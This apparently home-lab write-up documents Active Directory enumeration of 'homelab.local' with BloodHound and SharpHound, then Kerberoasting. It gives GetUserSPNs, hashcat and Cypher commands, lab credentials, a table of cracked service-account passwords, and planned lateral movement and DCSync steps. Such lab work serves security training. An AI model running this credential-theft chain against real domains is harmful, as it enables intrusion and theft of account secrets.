# 05 - BloodHound AD Enumeration & Kerberoasting

## Overview

This document covers the Active Directory enumeration performed against `homelab.local` using BloodHound CE and SharpHound, followed by Kerberoasting to extract and crack service account credentials.

**Attacker:** Kali Linux `10.10.10.100`
**Target DC:** DC01 `10.10.10.10` — `homelab.local`
**Domain user used:** `alice.rossi` / `Password123!`

---

## Phase 1 — BloodHound Graph Analysis

After importing the SharpHound ZIP (see `setup/12-bloodhound-sharphound-collection.md`), the BloodHound CE UI at `http://127.0.0.1:8080` is populated with domain data.

### 1.1 — UI Empty (pre-import baseline)

![BloodHound UI empty](screenshots/bh-11-kali-bloodhound-ui-empty.png)

### 1.2 — Domain Admin Node Properties

Search for the `Domain Admins` group to inspect its members and inbound edges.

![BloodHound: pathfinding DA properties](screenshots/bh-22-bloodhound-pathfinding-da-properties.png)

### 1.3 — Pathfinding: alice.rossi → Domain Admins

Use the **Pathfinding** tool: set `alice.rossi@HOMELAB.LOCAL` as start node.

![BloodHound: pathfinding alice start node](screenshots/bh-30-bloodhound-pathfinding-alice-start-node.png)

No direct path found from `alice.rossi` to Domain Admins via default edges:

![BloodHound: pathfinding alice → DA — path not found](screenshots/bh-33-bloodhound-pathfinding-alice-da-path-not-found.png)

However, ownership and GenericAll edges reveal lateral paths:

![BloodHound: pathfinding alice → DA — Owns + GenericAll](screenshots/bh-35-bloodhound-pathfinding-alice-da-owns-genericall.png)

### 1.4 — Search: alice.rossi Node

![BloodHound: search alice node](screenshots/bh-38-bloodhound-search-alice-node.png)

---

## Phase 2 — Cypher Queries

### 2.1 — GenericAll Relationships

```cypher
MATCH p=(u)-[:GenericAll]->(t) RETURN p
```

![BloodHound: Cypher GenericAll graph](screenshots/bh-27-bloodhound-cypher-genericall-graph.png)

![BloodHound: Cypher GenericAll results — 268](screenshots/bh-36-bloodhound-cypher-genericall-results-268.png)

268 GenericAll relationships found — confirms overprivileged ACL configuration in the lab domain.

### 2.2 — Shortest Path to Domain

```cypher
MATCH p=shortestPath((u:User)-[*1..]->(g:Group {name:"DOMAIN ADMINS@HOMELAB.LOCAL"})) RETURN p
```

![BloodHound: Cypher shortestPath domain graph](screenshots/bh-37-bloodhound-cypher-shortestpath-domain-graph.png)

![BloodHound: Cypher shortestPath with query visible](screenshots/bh-40-bloodhound-cypher-shortestpath-with-query.png)

### 2.3 — hasSPN Query (Kerberoastable Accounts)

```cypher
MATCH (u:User {hasspn:true}) RETURN u.name, u.serviceprincipalnames
```

![BloodHound: Cypher hasSPN — no results](screenshots/bh-39-bloodhound-cypher-hasspn-no-results.png)

**Note:** BloodHound CE returned no results for `hasspn:true` because SharpHound collected with `alice.rossi` (standard user) and the SPN property was not populated in this collection run. Kerberoastable accounts were identified via `GetUserSPNs.py` instead (see Phase 3).

---

## Phase 3 — Kerberoasting

### 3.1 — Extract TGS Hashes with GetUserSPNs

From Kali, request TGS tickets for all accounts with registered SPNs:

```bash
impacket-GetUserSPNs homelab.local/alice.rossi:Password123! \
  -dc-ip 10.10.10.10 \
  -outputfile /tmp/kerberoast.txt
```

![Kali: GetUserSPNs — hashes captured](screenshots/bh-24-kali-getuserspns-hashes-captured.png)

**Result:** 2 TGS hashes captured:
- `svc-sql` — SPN: `MSSQLSvc/dc01.homelab.local:1433`
- `svc-backup` — SPN: `BackupSvc/dc01.homelab.local`

**Hash type:** Kerberos 5, etype 18, TGS-REP (`$krb5tgs$18$...`) — AES-256.

### 3.2 — Hash Mode Identification (Troubleshooting)

Initial attempt used mode `13100` (RC4/etype 23) — incorrect for AES-256 hashes:

```bash
cat /tmp/kerberoast.txt
# Hash starts with $krb5tgs$18$ → etype 18 = AES-256 → mode 19700
```

![Kali: cat kerberoast — hashcat 13100 fail](screenshots/bh-29-kali-hashcat-cat-hashes-mode13100-error.png)

![Kali: cat kerberoast — hashcat 13100 fail (detail)](screenshots/bh-32-kali-cat-kerberoast-hashcat-13100-fail.png)

Correct mode: **19700** (Kerberos 5, etype 18, TGS-REP).

### 3.3 — Crack with rockyou.txt

First attempt using the standard wordlist:

```bash
hashcat -m 19700 /tmp/kerberoast.txt /usr/share/wordlists/rockyou.txt
```

![Kali: hashcat 19700 rockyou start](screenshots/bh-34-kali-hashcat-19700-rockyou-start.png)

rockyou.txt was running but had not cracked `svc-backup` within the session window:

![Kali: hashcat rockyou already running](screenshots/bh-23-kali-hashcat-rockyou-already-running.png)

![Kali: hashcat rockyou status 13%](screenshots/bh-26-kali-hashcat-rockyou-status-13pct.png)

![Hashcat rockyou running](screenshots/kerberoast-44-hashcat-rockyou-running.png)

![Hashcat rockyou progress](screenshots/kerberoast-45-hashcat-rockyou-progress.png)

### 3.4 — Crack with Custom Wordlist

Created a targeted wordlist based on known lab password patterns:

```bash
echo -e "SqlService2024!\nBackup!2024" > /tmp/custom.txt
cat /tmp/custom.txt
```

First run with `SqlService2024!` only:

```bash
hashcat -m 19700 /tmp/kerberoast.txt /tmp/custom.txt --force -w 3
```

![Hashcat custom wordlist start (1 password)](screenshots/kerberoast-41-hashcat-custom-wordlist-start.png)

**Result:** `svc-sql` cracked immediately:

![Hashcat svc-sql cracked](screenshots/kerberoast-42-hashcat-svcsql-cracked.png)

`svc-backup` exhausted (password not in single-entry wordlist):

![Hashcat svc-backup exhausted](screenshots/kerberoast-43-hashcat-svcbackup-exhausted.png)

Updated `custom.txt` with both passwords and re-ran. hashcat skipped the already-cracked `svc-sql` hash (potfile entry):

![Hashcat custom updated start](screenshots/kerberoast-47-hashcat-custom-updated-start.png)

![Hashcat final run start](screenshots/kerberoast-48-hashcat-final-run-start.png)

**Both hashes cracked:**

![Hashcat both cracked](screenshots/kerberoast-49-hashcat-both-cracked.png)

### 3.5 — Cracked Credentials

| Account | SPN | Password |
|---|---|---|
| `svc-sql` | `MSSQLSvc/dc01.homelab.local:1433` | `SqlService2024!` |
| `svc-backup` | `BackupSvc/dc01.homelab.local` | `Backup!2024` |

### 3.6 — Password Reset Attempt on DC01 (Failed — Policy)

Attempted to reset `svc-sql` password via PowerShell on DC01 to verify account control:

```powershell
Set-ADAccountPassword -Identity svc-sql `
  -NewPassword (ConvertTo-SecureString "password123" -AsPlainText -Force) -Reset
```

![DC01: password reset fail — complexity policy](screenshots/kerberoast-46-dc01-password-reset-fail.png)

**Result:** Failed — domain password policy requires complexity. This confirms the domain policy is active. A compliant password would succeed (e.g., `NewP@ss2024!`). Reset was not required for the lab objective.

---

## Results Summary

| Technique | Tool | Result |
|---|---|---|
| AD graph collection | SharpHound 2.12.0 | 316 objects |
| Graph analysis | BloodHound CE 9.1.0 | Domain mapped, ACL paths identified |
| SPN enumeration | impacket-GetUserSPNs | 2 Kerberoastable accounts |
| Hash cracking | hashcat mode 19700 | 2/2 cracked |

---

## Next Steps

- **Post-exploitation:** lateral movement to DC01 using `svc-sql` credentials via `impacket-smbexec`
- **Pass-the-Hash:** test NTLM hash reuse across domain accounts
- **DCSync:** use `labadmin` (Domain Admin) to dump all domain hashes via `impacket-secretsdump`

See `theory/04-active-directory/05-bloodhound-graph-analysis.md` for the theoretical background on BloodHound graph concepts and Kerberoasting mechanics.
